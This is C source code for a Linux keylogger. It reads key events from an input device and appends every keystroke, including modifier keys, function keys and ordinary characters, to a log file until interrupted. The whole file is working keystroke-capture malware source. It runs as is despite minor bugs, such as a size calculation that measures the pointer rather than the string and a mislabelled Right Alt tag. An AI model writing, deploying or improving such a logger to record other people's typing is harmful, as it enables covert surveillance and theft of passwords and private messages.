#include "prepareKey.h"
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <poll.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFFER_SIZE 20
FILE *outputfile;
struct pollfd fds[1];

void handle_sigint(int sig) {
    printf("\nCaptured Ctrl+c! Flushing buffer and closing file...\n");
    if (outputfile != NULL) {
        fclose(outputfile);
    }
    if (fds[0].fd) {
        close(fds[0].fd);
    }
    exit(0);
}

void logKey(char *key, FILE *outputfile, int *currentbuffersize) {
    fprintf(outputfile, "%s", key);
    *currentbuffersize += sizeof(key);
    if (*currentbuffersize >= BUFFER_SIZE) {
        fflush(outputfile);
        *currentbuffersize = 0;
    }
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Invalid number of arguments\n");
        printf("%s [device input filename] [output file]\n", argv[0]);
        return EXIT_FAILURE;
    }

    signal(SIGINT, handle_sigint);

    char *filename = argv[1];
    int timeoutMS = 5000;
    char *inputDev = argv[1];
    int ret;

    bool isCapsLockActive;
    bool isShiftActive;
    bool isCtrlActive;
    int currentbuffersize = 0;

    fds[0].fd = open(filename, 0, O_RDONLY | O_NONBLOCK);
    if (fds[0].fd < 0) {
        printf("Unable to open: %s\n", filename);
        return EXIT_FAILURE;
    }

    struct input_event event;
    fds[0].events = POLLIN;

    outputfile = fopen(argv[2], "a");

    while (true) {
        ret = poll(fds, 1, timeoutMS);

        if (ret > 0) {
            if (fds[0].revents) {
                read(fds[0].fd, &event, sizeof(event));
                if (event.type == EV_KEY) {
                    switch (event.code) {
                    case KEY_LEFTSHIFT:
                        if (event.value == 0) {
                            isShiftActive = false;
                            logKey("</Left Shift>", outputfile, &currentbuffersize);
                        } else if (event.value == 1) {
                            isShiftActive = true;
                            logKey("<Left Shift>", outputfile, &currentbuffersize);
                        } else {
                            isShiftActive = true;
                        }
                        break;

                    case KEY_RIGHTSHIFT:
                        if (event.value == 0) {
                            isShiftActive = false;
                            logKey("</Right Shift>", outputfile, &currentbuffersize);
                        } else if (event.value == 1) {
                            isShiftActive = true;
                            logKey("<Right Shift>", outputfile, &currentbuffersize);
                        } else {
                            isShiftActive = true;
                        }
                        break;

                    case KEY_LEFTCTRL:
                        if (event.value == 0) {
                            isCtrlActive = false;
                            logKey("</Left Ctrl>", outputfile, &currentbuffersize);
                        } else if (event.value == 1) {
                            isCtrlActive = true;
                            logKey("<Left Ctrl>", outputfile, &currentbuffersize);
                        } else {
                            isCtrlActive = true;
                        }
                        break;

                    case KEY_RIGHTCTRL:
                        if (event.value == 0) {
                            isCtrlActive = false;
                            logKey("</Right Ctrl>", outputfile, &currentbuffersize);
                        } else if (event.value == 1) {
                            isCtrlActive = true;
                            logKey("<Right Ctrl>", outputfile, &currentbuffersize);
                        } else {
                            isCtrlActive = true;
                        }
                        break;

                    case KEY_ENTER:
                        if (event.value != 1) {
                            logKey("<Enter />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_BACKSPACE:
                        if (event.value != 1) {
                            logKey("<Backspace />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_ESC:
                        if (event.value != 1) {
                            logKey("<Escape />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_TAB:
                        if (event.value != 1) {
                            logKey("Tab />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_DELETE:
                        if (event.value != 1) {
                            logKey("<Delete />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F1:
                        if (event.value != 1) {
                            logKey("<F1 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F2:
                        if (event.value != 1) {
                            logKey("<F2 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F3:
                        if (event.value != 1) {
                            logKey("<F3 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F4:
                        if (event.value != 1) {
                            logKey("<F4 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F5:
                        if (event.value != 1) {
                            logKey("<F5 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F6:
                        if (event.value != 1) {
                            logKey("<F6 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F7:
                        if (event.value != 1) {
                            logKey("<F7 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F8:
                        if (event.value != 1) {
                            logKey("<F8 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F9:
                        if (event.value != 1) {
                            logKey("<F9 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F10:
                        if (event.value != 1) {
                            logKey("<F10 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F11:
                        if (event.value != 1) {
                            logKey("<F11 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F12:
                        if (event.value != 1) {
                            logKey("<F12 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F13:
                        if (event.value != 1) {
                            logKey("<F13 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F14:
                        if (event.value != 1) {
                            logKey("<F14 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F15:
                        if (event.value != 1) {
                            logKey("<F15 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F16:
                        if (event.value != 1) {
                            logKey("<F16 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F17:
                        if (event.value != 1) {
                            logKey("<F17 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F18:
                        if (event.value != 1) {
                            logKey("<F18 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F19:
                        if (event.value != 1) {
                            logKey("<F19 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F20:
                        if (event.value != 1) {
                            logKey("<F20 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F21:
                        if (event.value != 1) {
                            logKey("<F21 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F22:
                        if (event.value != 1) {
                            logKey("<F22 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F23:
                        if (event.value != 1) {
                            logKey("<F23 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_F24:
                        if (event.value != 1) {
                            logKey("<F24 />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_FN:
                        if (event.value == 0) {
                            logKey("</Fn>", outputfile, &currentbuffersize);
                        } else if (event.value == 1) {
                            logKey("<Fn>", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_CAPSLOCK:
                        if (event.value != 1) {
                            if (!isCapsLockActive) {
                                logKey("<Caps Lock>", outputfile, &currentbuffersize);
                            } else {
                                logKey("</Caps Lock>", outputfile, &currentbuffersize);
                            }
                        }
                        break;

                    case KEY_LEFTMETA:
                        if (event.value == 0) {
                            logKey("</Left Meta>", outputfile, &currentbuffersize);
                        } else if (event.value == 1) {
                            logKey("<Left Meta>", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_RIGHTMETA:
                        if (event.value == 0) {
                            logKey("</Right Meta>", outputfile, &currentbuffersize);
                        } else if (event.value == 1) {
                            logKey("<Right Meta>", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_SPACE:
                        if (event.value == 0) {
                            logKey("<Space />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_LEFT:
                        if (event.value == 0) {
                            logKey("<Left Arrow />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_RIGHT:
                        if (event.value == 0) {
                            logKey("<Right Arrow />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_UP:
                        if (event.value == 0) {
                            logKey("<Up Arrow />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_DOWN:
                        if (event.value == 0) {
                            logKey("<Down Arrow />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_END:
                        if (event.value == 0) {
                            logKey("<End />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_HOME:
                        if (event.value == 0) {
                            logKey("<Home />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_LEFTALT:
                        if (event.value == 0) {
                            logKey("</Left Alt>", outputfile, &currentbuffersize);
                        } else if (event.value == 1) {
                            logKey("<Left Alt>", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_RIGHTALT:
                        if (event.value == 0) {
                            logKey("</Right Alt>", outputfile, &currentbuffersize);
                        } else if (event.value == 1) {
                            logKey("<Left Alt>", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_PAGEUP:
                        if (event.value == 0) {
                            logKey("<Page Up />", outputfile, &currentbuffersize);
                        }
                        break;

                    case KEY_PAGEDOWN:
                        if (event.value == 0) {
                            logKey("<Page Down />", outputfile, &currentbuffersize);
                        }
                        break;

                    default:
                        if (event.value != 1) {
                            logKey(
                                (char[]){prepareKey(event.code, isShiftActive, isCtrlActive), '\0'},
                                outputfile, &currentbuffersize);
                        }
                        break;
                    }
                }
            }
        }
    }

    return 0;
}
